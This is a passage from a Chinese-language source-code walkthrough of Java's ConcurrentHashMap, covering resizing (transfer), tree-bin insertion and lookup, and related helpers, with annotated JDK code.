<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">resizeStamp</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Integer.numberOfLeadingZeros(n) | (<span class="number">1</span> &lt;&lt; (RESIZE_STAMP_BITS - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-8-transfer-Node-tab-Node-nextTab"><a href="#6-8-transfer-Node-tab-Node-nextTab" class="headerlink" title="6.8 transfer(Node&lt;K,V&gt;[] tab, Node&lt;K,V&gt;[] nextTab)"></a>6.8 transfer(Node&lt;K,V&gt;[] tab, Node&lt;K,V&gt;[] nextTab)</h2><p>扩容。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">transfer</span><span class="params">(Node&lt;K,V&gt;[] tab, Node&lt;K,V&gt;[] nextTab)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> tab.length, stride;</span><br><span class="line">    <span class="comment">// 若核心数 &gt; 1，步长为：(数组长度/8) / 核心数，否则为n。若此步长小于16，默认步长为16。步长：每次transfer处理的数组元素个数。</span></span><br><span class="line">    <span class="keyword">if</span> ((stride = (NCPU &gt; <span class="number">1</span>) ? (n &gt;&gt;&gt; <span class="number">3</span>) / NCPU : n) &lt; MIN_TRANSFER_STRIDE)</span><br><span class="line">        stride = MIN_TRANSFER_STRIDE; <span class="comment">// subdivide range</span></span><br><span class="line">    <span class="comment">// nextTab为null，创建长度为原来2倍的数组。</span></span><br><span class="line">    <span class="keyword">if</span> (nextTab == <span class="literal">null</span>) &#123;            <span class="comment">// initiating</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            Node&lt;K,V&gt;[] nt = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>&lt;?,?&gt;[n &lt;&lt; <span class="number">1</span>];</span><br><span class="line">            nextTab = nt;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable ex) &#123;      <span class="comment">// try to cope with OOME</span></span><br><span class="line">            sizeCtl = Integer.MAX_VALUE;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        nextTable = nextTab;</span><br><span class="line">        <span class="comment">// 此时transferIndex值为旧数组长度</span></span><br><span class="line">        transferIndex = n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">nextn</span> <span class="operator">=</span> nextTab.length;</span><br><span class="line">    <span class="comment">// 创建ForwardingNode节点，其nextTable为nextTab，hash值为MOVED（即-1）。其自身不保存任何数据（key/value为null）。</span></span><br><span class="line">    ForwardingNode&lt;K,V&gt; fwd = <span class="keyword">new</span> <span class="title class_">ForwardingNode</span>&lt;K,V&gt;(nextTab);</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">advance</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">finishing</span> <span class="operator">=</span> <span class="literal">false</span>; <span class="comment">// to ensure sweep before committing nextTab</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, bound = <span class="number">0</span>;;) &#123;		<span class="comment">// 注意：这个i作为后续遍历的数组下标。</span></span><br><span class="line">        Node&lt;K,V&gt; f; <span class="type">int</span> fh;</span><br><span class="line">        <span class="keyword">while</span> (advance) &#123;</span><br><span class="line">            <span class="type">int</span> nextIndex, nextBound;</span><br><span class="line">            <span class="keyword">if</span> (--i &gt;= bound || finishing)</span><br><span class="line">                advance = <span class="literal">false</span>;</span><br><span class="line">            <span class="comment">// transferIndex赋值给nextIndex</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((nextIndex = transferIndex) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                i = -<span class="number">1</span>;</span><br><span class="line">                advance = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (U.compareAndSwapInt</span><br><span class="line">                     (<span class="built_in">this</span>, TRANSFERINDEX, nextIndex,</span><br><span class="line">                      nextBound = (nextIndex &gt; stride ?</span><br><span class="line">                                   nextIndex - stride : <span class="number">0</span>))) &#123;</span><br><span class="line">                bound = nextBound;</span><br><span class="line">                <span class="comment">// i每次-1，即在步长范围内，从后往前遍历处理。</span></span><br><span class="line">                i = nextIndex - <span class="number">1</span>;</span><br><span class="line">                advance = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= n || i + n &gt;= nextn) &#123;</span><br><span class="line">            <span class="type">int</span> sc;</span><br><span class="line">            <span class="comment">// 扩容完成，计算阈值: n*2 - n/2 = (3/2)*n。则(3/2)*n / 2n = 0.75，扩容因子是0.75。</span></span><br><span class="line">            <span class="keyword">if</span> (finishing) &#123;</span><br><span class="line">                nextTable = <span class="literal">null</span>;</span><br><span class="line">                table = nextTab;</span><br><span class="line">                sizeCtl = (n &lt;&lt; <span class="number">1</span>) - (n &gt;&gt;&gt; <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (U.compareAndSwapInt(<span class="built_in">this</span>, SIZECTL, sc = sizeCtl, sc - <span class="number">1</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((sc - <span class="number">2</span>) != resizeStamp(n) &lt;&lt; RESIZE_STAMP_SHIFT)</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                finishing = advance = <span class="literal">true</span>;</span><br><span class="line">                i = n; <span class="comment">// recheck before commit</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 元素节点为null，添加转换节点。</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((f = tabAt(tab, i)) == <span class="literal">null</span>)</span><br><span class="line">            advance = casTabAt(tab, i, <span class="literal">null</span>, fwd);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((fh = f.hash) == MOVED)</span><br><span class="line">            advance = <span class="literal">true</span>; <span class="comment">// already processed</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (f) &#123;</span><br><span class="line">                <span class="keyword">if</span> (tabAt(tab, i) == f) &#123;</span><br><span class="line">                    Node&lt;K,V&gt; ln, hn;</span><br><span class="line">                    <span class="keyword">if</span> (fh &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">runBit</span> <span class="operator">=</span> fh &amp; n;</span><br><span class="line">                        Node&lt;K,V&gt; lastRun = f;</span><br><span class="line">                        <span class="keyword">for</span> (Node&lt;K,V&gt; p = f.next; p != <span class="literal">null</span>; p = p.next) &#123;</span><br><span class="line">                            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> p.hash &amp; n;</span><br><span class="line">                            <span class="keyword">if</span> (b != runBit) &#123;</span><br><span class="line">                                runBit = b;</span><br><span class="line">                                lastRun = p;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// hash与旧数组长度做按位与运算为0的节点，在新容器中，下标不变。记录低位，高位为null。</span></span><br><span class="line">                        <span class="keyword">if</span> (runBit == <span class="number">0</span>) &#123;</span><br><span class="line">                            ln = lastRun;</span><br><span class="line">                            hn = <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 反之，下标为原下标+原数组长度，这点在HashMap中分析过（HashMap源码分析的5.3）。记录高位，低位为null。</span></span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            hn = lastRun;</span><br><span class="line">                            ln = <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 分别创建低高位的节点。</span></span><br><span class="line">                        <span class="keyword">for</span> (Node&lt;K,V&gt; p = f; p != lastRun; p = p.next) &#123;</span><br><span class="line">                            <span class="type">int</span> <span class="variable">ph</span> <span class="operator">=</span> p.hash; <span class="type">K</span> <span class="variable">pk</span> <span class="operator">=</span> p.key; <span class="type">V</span> <span class="variable">pv</span> <span class="operator">=</span> p.val;</span><br><span class="line">                            <span class="keyword">if</span> ((ph &amp; n) == <span class="number">0</span>)</span><br><span class="line">                                ln = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;K,V&gt;(ph, pk, pv, ln);</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                hn = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;K,V&gt;(ph, pk, pv, hn);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 低位下标不变，高位下标为旧下标+旧数组长度。setTabAt方法详细：6.9。</span></span><br><span class="line">                        setTabAt(nextTab, i, ln);</span><br><span class="line">                        setTabAt(nextTab, i + n, hn);</span><br><span class="line">                        <span class="comment">// 扩容过程中，tab[i]设置为转换节点。</span></span><br><span class="line">                        setTabAt(tab, i, fwd);</span><br><span class="line">                        advance = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// TreeBin下的红黑树节点也是类似的过程，不同的是，转换后，可能需要反树化（红黑树-&gt;单链表）</span></span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (f <span class="keyword">instanceof</span> TreeBin) &#123;</span><br><span class="line">                        TreeBin&lt;K,V&gt; t = (TreeBin&lt;K,V&gt;)f;</span><br><span class="line">                        TreeNode&lt;K,V&gt; lo = <span class="literal">null</span>, loTail = <span class="literal">null</span>;</span><br><span class="line">                        TreeNode&lt;K,V&gt; hi = <span class="literal">null</span>, hiTail = <span class="literal">null</span>;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">lc</span> <span class="operator">=</span> <span class="number">0</span>, hc = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">for</span> (Node&lt;K,V&gt; e = t.first; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">                            <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> e.hash;</span><br><span class="line">                            TreeNode&lt;K,V&gt; p = <span class="keyword">new</span> <span class="title class_">TreeNode</span>&lt;K,V&gt;</span><br><span class="line">                                (h, e.key, e.val, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">                            <span class="keyword">if</span> ((h &amp; n) == <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> ((p.prev = loTail) == <span class="literal">null</span>)</span><br><span class="line">                                    lo = p;</span><br><span class="line">                                <span class="keyword">else</span></span><br><span class="line">                                    loTail.next = p;</span><br><span class="line">                                loTail = p;</span><br><span class="line">                                ++lc;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> ((p.prev = hiTail) == <span class="literal">null</span>)</span><br><span class="line">                                    hi = p;</span><br><span class="line">                                <span class="keyword">else</span></span><br><span class="line">                                    hiTail.next = p;</span><br><span class="line">                                hiTail = p;</span><br><span class="line">                                ++hc;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 反树化，详细：6.10。</span></span><br><span class="line">                        ln = (lc &lt;= UNTREEIFY_THRESHOLD) ? untreeify(lo) :</span><br><span class="line">                        (hc != <span class="number">0</span>) ? <span class="keyword">new</span> <span class="title class_">TreeBin</span>&lt;K,V&gt;(lo) : t;</span><br><span class="line">                        hn = (hc &lt;= UNTREEIFY_THRESHOLD) ? untreeify(hi) :</span><br><span class="line">                        (lc != <span class="number">0</span>) ? <span class="keyword">new</span> <span class="title class_">TreeBin</span>&lt;K,V&gt;(hi) : t;</span><br><span class="line">                        setTabAt(nextTab, i, ln);</span><br><span class="line">                        setTabAt(nextTab, i + n, hn);</span><br><span class="line">                        setTabAt(tab, i, fwd);</span><br><span class="line">                        advance = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-9-setTabAt-Node-tab-int-i-Node-v"><a href="#6-9-setTabAt-Node-tab-int-i-Node-v" class="headerlink" title="6.9 setTabAt(Node&lt;K,V&gt;[] tab, int i, Node&lt;K,V&gt; v)"></a>6.9 setTabAt(Node&lt;K,V&gt;[] tab, int i, Node&lt;K,V&gt; v)</h2><p>设置tab[i]为v。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> &lt;K,V&gt; <span class="keyword">void</span> <span class="title function_">setTabAt</span><span class="params">(Node&lt;K,V&gt;[] tab, <span class="type">int</span> i, Node&lt;K,V&gt; v)</span> &#123;</span><br><span class="line">    U.putObjectVolatile(tab, ((<span class="type">long</span>)i &lt;&lt; ASHIFT) + ABASE, v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-10-untreeify-Node-b"><a href="#6-10-untreeify-Node-b" class="headerlink" title="6.10 untreeify(Node&lt;K,V&gt; b)"></a>6.10 untreeify(Node&lt;K,V&gt; b)</h2><p>反树化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &lt;K,V&gt; Node&lt;K,V&gt; <span class="title function_">untreeify</span><span class="params">(Node&lt;K,V&gt; b)</span> &#123;</span><br><span class="line">    Node&lt;K,V&gt; hd = <span class="literal">null</span>, tl = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 直接通过单链表的方式遍历即可。</span></span><br><span class="line">    <span class="keyword">for</span> (Node&lt;K,V&gt; q = b; q != <span class="literal">null</span>; q = q.next) &#123;</span><br><span class="line">        Node&lt;K,V&gt; p = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;K,V&gt;(q.hash, q.key, q.val, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (tl == <span class="literal">null</span>)</span><br><span class="line">            hd = p;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            tl.next = p;</span><br><span class="line">        tl = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分割线-1"><a href="#分割线-1" class="headerlink" title="&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 分割线 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;"></a>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 分割线 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</h2><h2 id="6-11-putTreeVal-int-h-K-k-V-v"><a href="#6-11-putTreeVal-int-h-K-k-V-v" class="headerlink" title="6.11 putTreeVal(int h, K k, V v)"></a>6.11 putTreeVal(int h, K k, V v)</h2><p>查找或插入红黑树节点，返回null为插入节点，不是null则为查找节点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> TreeNode&lt;K,V&gt; <span class="title function_">putTreeVal</span><span class="params">(<span class="type">int</span> h, K k, V v)</span> &#123;</span><br><span class="line">    Class&lt;?&gt; kc = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">searched</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (TreeNode&lt;K,V&gt; p = root;;) &#123;</span><br><span class="line">        <span class="type">int</span> dir, ph; K pk;</span><br><span class="line">        <span class="comment">// p为null，插入节点为根节点。</span></span><br><span class="line">        <span class="keyword">if</span> (p == <span class="literal">null</span>) &#123;</span><br><span class="line">            first = root = <span class="keyword">new</span> <span class="title class_">TreeNode</span>&lt;K,V&gt;(h, k, v, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 插入节点的hash &lt; 当前节点p的hash，插入到左子节点下，先用dir=-1记录为左子节点。</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((ph = p.hash) &gt; h)</span><br><span class="line">            dir = -<span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 插入节点的hash &gt; 当前节点p的hash，插入到右子节点下，先用dir=1记录为右子节点。</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ph &lt; h)</span><br><span class="line">            dir = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// hash相等，并且key内存地址一样或相互equals，即key完全相等，返回找到的节点。</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((pk = p.key) == k || (pk != <span class="literal">null</span> &amp;&amp; k.equals(pk)))</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        <span class="comment">// hash相等，但key不相等。且key没有实现Comparable接口或者pk类型与k不同，无法比较。（HashMap中也有类似的分析）</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((kc == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                  <span class="comment">// 若k直接实现了Comparable接口，并指定其泛型参数，则返回k的Class，详细：6.12。</span></span><br><span class="line">                  (kc = comparableClassFor(k)) == <span class="literal">null</span>) ||</span><br><span class="line">                 <span class="comment">// 详细：6.13</span></span><br><span class="line">                 (dir = compareComparables(kc, k, pk)) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!searched) &#123;</span><br><span class="line">                TreeNode&lt;K,V&gt; q, ch;</span><br><span class="line">                <span class="comment">// 遍历完一次后，不再遍历。</span></span><br><span class="line">                searched = <span class="literal">true</span>;</span><br><span class="line">                <span class="comment">// 分别在节点p的左右子树下查找节点，findTreeNode方法内部递归遍历指定根节点下的所有子节点，详细：6.14</span></span><br><span class="line">                <span class="keyword">if</span> (((ch = p.left) != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                     (q = ch.findTreeNode(h, k, kc)) != <span class="literal">null</span>) ||</span><br><span class="line">                    ((ch = p.right) != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                     (q = ch.findTreeNode(h, k, kc)) != <span class="literal">null</span>))</span><br><span class="line">                    <span class="keyword">return</span> q;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 仍然没找到对应的节点，若k、pk任一个为null，或两者ClassName相等，比较两者hashCode决定遍历方向，详细：6.15。</span></span><br><span class="line">            dir = tieBreakOrder(k, pk);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TreeNode&lt;K,V&gt; xp = p;</span><br><span class="line">        <span class="comment">// 若dir &lt;= 0且左子节点为null，则新插入节点为p的左子节点。若dir &gt; 0且右子节点为null，则新插入节点为p的右子节点。</span></span><br><span class="line">        <span class="keyword">if</span> ((p = (dir &lt;= <span class="number">0</span>) ? p.left : p.right) == <span class="literal">null</span>) &#123;</span><br><span class="line">            TreeNode&lt;K,V&gt; x, f = first;</span><br><span class="line">            <span class="comment">// 新插入的节点作为first节点，下一个节点为插入前的first节点，维系了双链表中的头插法的关系（HashMap中的红黑树维系的是双链表尾插法）。</span></span><br><span class="line">            first = x = <span class="keyword">new</span> <span class="title class_">TreeNode</span>&lt;K,V&gt;(h, k, v, f, xp);</span><br><span class="line">            <span class="keyword">if</span> (f != <span class="literal">null</span>)</span><br><span class="line">                <span class="comment">// 旧的first节点上一个节点为新节点。</span></span><br><span class="line">                f.prev = x;</span><br><span class="line">            <span class="keyword">if</span> (dir &lt;= <span class="number">0</span>)</span><br><span class="line">                xp.left = x;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                xp.right = x;</span><br><span class="line">            <span class="comment">// 父节点为黑色，新插入的子节点设置为红色。</span></span><br><span class="line">            <span class="keyword">if</span> (!xp.red)</span><br><span class="line">                x.red = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                lockRoot();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 节点x做平衡插入调整，详细：6.17。</span></span><br><span class="line">                    root = balanceInsertion(root, x);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    unlockRoot();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 递归检查是否合法（略）</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="title function_">checkInvariants</span><span class="params">(root)</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-12-comparableClassFor-Object-x"><a href="#6-12-comparableClassFor-Object-x" class="headerlink" title="6.12 comparableClassFor(Object x)"></a>6.12 comparableClassFor(Object x)</h2><p>若x直接实现了Comparable接口，并且指定泛型的参数类型为x.class，则返回x.class，否则返回null。如：User implements Comparable<User>，返回User.class。（与HashMap中的一样，详细可查看HashMap对应方法的解析。）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> Class&lt;?&gt; comparableClassFor(Object x) &#123;</span><br><span class="line">    <span class="keyword">if</span> (x <span class="keyword">instanceof</span> Comparable) &#123;</span><br><span class="line">        Class&lt;?&gt; c; Type[] ts, as; Type t; ParameterizedType p;</span><br><span class="line">        <span class="keyword">if</span> ((c = x.getClass()) == String.class) <span class="comment">// bypass checks</span></span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        <span class="keyword">if</span> ((ts = c.getGenericInterfaces()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ts.length; ++i) &#123;</span><br><span class="line">                <span class="keyword">if</span> (((t = ts[i]) <span class="keyword">instanceof</span> ParameterizedType) &amp;&amp;</span><br><span class="line">                    ((p = (ParameterizedType)t).getRawType() ==</span><br><span class="line">                     Comparable.class) &amp;&amp;</span><br><span class="line">                    (as = p.getActualTypeArguments()) != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                    as.length == <span class="number">1</span> &amp;&amp; as[<span class="number">0</span>] == c) <span class="comment">// type arg is c</span></span><br><span class="line">                    <span class="keyword">return</span> c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-13-compareComparables-Class-kc-Object-k-Object-x"><a href="#6-13-compareComparables-Class-kc-Object-k-Object-x" class="headerlink" title="6.13 compareComparables(Class&lt;?&gt; kc, Object k, Object x)"></a>6.13 compareComparables(Class&lt;?&gt; kc, Object k, Object x)</h2><p>Comparable实现类对象的比较。（与HashMap中的一样，详细可查看HashMap对应方法的解析。）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="type">int</span> <span class="title function_">compareComparables</span><span class="params">(Class&lt;?&gt; kc, Object k, Object x)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (x == <span class="literal">null</span> || x.getClass() != kc ? <span class="number">0</span> :</span><br><span class="line">            ((Comparable)k).compareTo(x));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-14-findTreeNode-int-h-Object-k-Class-kc"><a href="#6-14-findTreeNode-int-h-Object-k-Class-kc" class="headerlink" title="6.14 findTreeNode(int h, Object k, Class&lt;?&gt; kc)"></a>6.14 findTreeNode(int h, Object k, Class&lt;?&gt; kc)</h2><p>查找指定根节点下的hash为h、key为k的节点，找不到返回null。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> TreeNode&lt;K,V&gt; <span class="title function_">findTreeNode</span><span class="params">(<span class="type">int</span> h, Object k, Class&lt;?&gt; kc)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (k != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 把当前节点作为根节点遍历。</span></span><br><span class="line">        TreeNode&lt;K,V&gt; p = <span class="built_in">this</span>;</span><br><span class="line">        <span class="keyword">do</span>  &#123;</span><br><span class="line">            <span class="type">int</span> ph, dir; K pk; TreeNode&lt;K,V&gt; q;</span><br><span class="line">            TreeNode&lt;K,V&gt; pl = p.left, pr = p.right;</span><br><span class="line">            <span class="comment">// h &lt; ph，往左子树遍历。</span></span><br><span class="line">            <span class="keyword">if</span> ((ph = p.hash) &gt; h)</span><br><span class="line">                p = pl;</span><br><span class="line">            <span class="comment">// h &gt; ph，往右子树遍历。</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (ph &lt; h)</span><br><span class="line">                p = pr;</span><br><span class="line">            <span class="comment">// key完全相同，返回节点。</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((pk = p.key) == k || (pk != <span class="literal">null</span> &amp;&amp; k.equals(pk)))</span><br><span class="line">                <span class="keyword">return</span> p;</span><br><span class="line">            <span class="comment">// hash值一样，key不相同，且左子节点为null，往右子树遍历。</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (pl == <span class="literal">null</span>)</span><br><span class="line">                p = pr;</span><br><span class="line">            <span class="comment">// hash值一样，key不相同，且右子节点为null，往左子树遍历。</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (pr == <span class="literal">null</span>)</span><br><span class="line">                p = pl;</span><br><span class="line">            <span class="comment">// hash值一样，key不相同，左右子节点均不为null，而且k实现了Comparable接口，通过compareComparables决定遍历方向。</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((kc != <span class="literal">null</span> ||</span><br><span class="line">                      (kc = comparableClassFor(k)) != <span class="literal">null</span>) &amp;&amp;</span><br><span class="line">                     (dir = compareComparables(kc, k, pk)) != <span class="number">0</span>)</span><br><span class="line">                p = (dir &lt; <span class="number">0</span>) ? pl : pr;</span><br><span class="line">            <span class="comment">// hash值一样，key不相同，左右子节点均不为null，k没有实现Comparable接口，先往右子树找。</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((q = pr.findTreeNode(h, k, kc)) != <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">return</span> q;</span><br><span class="line">            <span class="comment">// 没找到，继续往左子树找。</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                p = pl;</span><br><span class="line">        &#125; <span class="keyword">while</span> (p != <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-15-tieBreakOrder-Object-a-Object-b"><a href="#6-15-tieBreakOrder-Object-a-Object-b" class="headerlink" title="6.15 tieBreakOrder(Object a, Object b)"></a>6.15 tieBreakOrder(Object a, Object b)</h2><p>若a为null或b为null或两者类名相同，a的hashCode小于等于b的hashCode返回-1，大于则返回1。条件不成立返回0。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="type">int</span> <span class="title function_">tieBreakOrder</span><span class="params">(Object a, Object b)</span> &#123;</span><br><span class="line">    <span class="type">int</span> d;</span><br><span class="line">    <span class="keyword">if</span> (a == <span class="literal">null</span> || b == <span class="literal">null</span> ||</span><br><span class="line">        (d = a.getClass().getName().</span><br><span class="line">         compareTo(b.getClass().getName())) == <span class="number">0</span>)</span><br><span class="line">        d = (System.identityHashCode(a) &lt;= System.identityHashCode(b) ?</span><br><span class="line">             -<span class="number">1</span> : <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-16-lockRoot"><a href="#6-16-lockRoot" class="headerlink" title="6.16 lockRoot()"></a>6.16 lockRoot()</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">lockRoot</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!U.compareAndSwapInt(<span class="built_in">this</span>, LOCKSTATE, <span class="number">0</span>, WRITER))</span><br><span class="line">        contendedLock(); <span class="comment">// offload to separate method</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-17-balanceInsertion-TreeNode-root-TreeNode-x"><a href="#6-17-balanceInsertion-TreeNode-root-TreeNode-x" class="headerlink" title="6.17 balanceInsertion(TreeNode&lt;K,V&gt; root, TreeNode&lt;K,V&gt; x)"></a>6.17 balanceInsertion(TreeNode&lt;K,V&gt; root, TreeNode&lt;K,V&gt; x)</h2><p>平衡插入节点，与HashMap中的完全相同（HashMap源码分析的5.5.6），这里不再赘述。</p>
